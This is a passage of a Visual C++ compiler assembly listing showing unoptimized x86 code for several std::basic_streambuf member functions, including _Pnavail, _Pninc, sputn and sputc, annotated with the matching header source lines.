  0000c	8b 48 20	 mov	 ecx, DWORD PTR [eax+32]
  0000f	83 39 00	 cmp	 DWORD PTR [ecx], 0
  00012	74 0d		 je	 SHORT $LN3@Pnavail
  00014	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00017	8b 42 30	 mov	 eax, DWORD PTR [edx+48]
  0001a	8b 08		 mov	 ecx, DWORD PTR [eax]
  0001c	89 4d f8	 mov	 DWORD PTR tv69[ebp], ecx
  0001f	eb 07		 jmp	 SHORT $LN4@Pnavail
$LN3@Pnavail:
  00021	c7 45 f8 00 00
	00 00		 mov	 DWORD PTR tv69[ebp], 0
$LN4@Pnavail:
  00028	8b 45 f8	 mov	 eax, DWORD PTR tv69[ebp]
  0002b	99		 cdq

; 262  :     }

  0002c	8b e5		 mov	 esp, ebp
  0002e	5d		 pop	 ebp
  0002f	c3		 ret	 0
?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ
_TEXT	SEGMENT
tv76 = -8						; size = 4
_this$ = -4						; size = 4
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ PROC ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc, COMDAT
; _this$ = ecx

; 255  :     _Elem* __CLR_OR_THIS_CALL _Pninc() noexcept { // increment current position in write buffer

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 256  :         --*_IPcount;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 48 30	 mov	 ecx, DWORD PTR [eax+48]
  0000f	8b 11		 mov	 edx, DWORD PTR [ecx]
  00011	83 ea 01	 sub	 edx, 1
  00014	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00017	8b 48 30	 mov	 ecx, DWORD PTR [eax+48]
  0001a	89 11		 mov	 DWORD PTR [ecx], edx

; 257  :         return (*_IPnext)++;

  0001c	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0001f	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  00022	8b 08		 mov	 ecx, DWORD PTR [eax]
  00024	89 4d f8	 mov	 DWORD PTR tv76[ebp], ecx
  00027	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  0002a	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  0002d	8b 08		 mov	 ecx, DWORD PTR [eax]
  0002f	83 c1 01	 add	 ecx, 1
  00032	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00035	8b 42 20	 mov	 eax, DWORD PTR [edx+32]
  00038	89 08		 mov	 DWORD PTR [eax], ecx
  0003a	8b 45 f8	 mov	 eax, DWORD PTR tv76[ebp]

; 258  :     }

  0003d	8b e5		 mov	 esp, ebp
  0003f	5d		 pop	 ebp
  00040	c3		 ret	 0
?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ENDP ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z
_TEXT	SEGMENT
tv71 = -8						; size = 4
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 8
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputn, COMDAT
; _this$ = ecx

; 170  :         streamsize _Count) { // put _Count characters from array beginning at _Ptr

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 171  :         return xsputn(_Ptr, _Count);

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	8b 51 24	 mov	 edx, DWORD PTR [ecx+36]
  00011	89 55 f8	 mov	 DWORD PTR tv71[ebp], edx
  00014	8b 45 10	 mov	 eax, DWORD PTR __Count$[ebp+4]
  00017	50		 push	 eax
  00018	8b 4d 0c	 mov	 ecx, DWORD PTR __Count$[ebp]
  0001b	51		 push	 ecx
  0001c	8b 55 08	 mov	 edx, DWORD PTR __Ptr$[ebp]
  0001f	52		 push	 edx
  00020	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	ff 55 f8	 call	 DWORD PTR tv71[ebp]

; 172  :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c2 0c 00	 ret	 12			; 0000000cH
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputn
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z
_TEXT	SEGMENT
tv89 = -24						; size = 8
tv81 = -16						; size = 4
tv79 = -12						; size = 4
tv82 = -8						; size = 4
_this$ = -4						; size = 4
__Ch$ = 8						; size = 1
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z PROC ; std::basic_streambuf<char,std::char_traits<char> >::sputc, COMDAT
; _this$ = ecx

; 165  :     int_type __CLR_OR_THIS_CALL sputc(_Elem _Ch) { // put a character

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 18	 sub	 esp, 24			; 00000018H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 166  :         return 0 < _Pnavail() ? _Traits::to_int_type(*_Pninc() = _Ch) : overflow(_Traits::to_int_type(_Ch));

  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IBE_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
  00011	89 45 e8	 mov	 DWORD PTR tv89[ebp], eax
  00014	89 55 ec	 mov	 DWORD PTR tv89[ebp+4], edx
  00017	83 7d ec 00	 cmp	 DWORD PTR tv89[ebp+4], 0
  0001b	7c 27		 jl	 SHORT $LN3@sputc
  0001d	7f 06		 jg	 SHORT $LN5@sputc
  0001f	83 7d e8 00	 cmp	 DWORD PTR tv89[ebp], 0
  00023	76 1f		 jbe	 SHORT $LN3@sputc
$LN5@sputc:
  00025	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00028	e8 00 00 00 00	 call	 ?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IAEPADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
  0002d	8a 4d 08	 mov	 cl, BYTE PTR __Ch$[ebp]
  00030	88 08		 mov	 BYTE PTR [eax], cl
  00032	0f b6 55 08	 movzx	 edx, BYTE PTR __Ch$[ebp]
  00036	52		 push	 edx
  00037	e8 00 00 00 00	 call	 ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
  0003c	83 c4 04	 add	 esp, 4
  0003f	89 45 f8	 mov	 DWORD PTR tv82[ebp], eax
  00042	eb 28		 jmp	 SHORT $LN4@sputc
$LN3@sputc:
  00044	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00047	8b 08		 mov	 ecx, DWORD PTR [eax]
  00049	8b 51 0c	 mov	 edx, DWORD PTR [ecx+12]
  0004c	89 55 f0	 mov	 DWORD PTR tv81[ebp], edx
  0004f	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]
  00053	50		 push	 eax
  00054	e8 00 00 00 00	 call	 ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ; std::_Narrow_char_traits<char,int>::to_int_type
  00059	83 c4 04	 add	 esp, 4
  0005c	89 45 f4	 mov	 DWORD PTR tv79[ebp], eax
  0005f	8b 4d f4	 mov	 ecx, DWORD PTR tv79[ebp]
  00062	51		 push	 ecx
  00063	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00066	ff 55 f0	 call	 DWORD PTR tv81[ebp]
  00069	89 45 f8	 mov	 DWORD PTR tv82[ebp], eax
$LN4@sputc:
  0006c	8b 45 f8	 mov	 eax, DWORD PTR tv82[ebp]

; 167  :     }

  0006f	8b e5		 mov	 esp, ebp
  00071	5d		 pop	 ebp
  00072	c2 04 00	 ret	 4
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ENDP ; std::basic_streambuf<char,std::char_traits<char> >::sputc
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\streambuf
;	COMDAT ?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
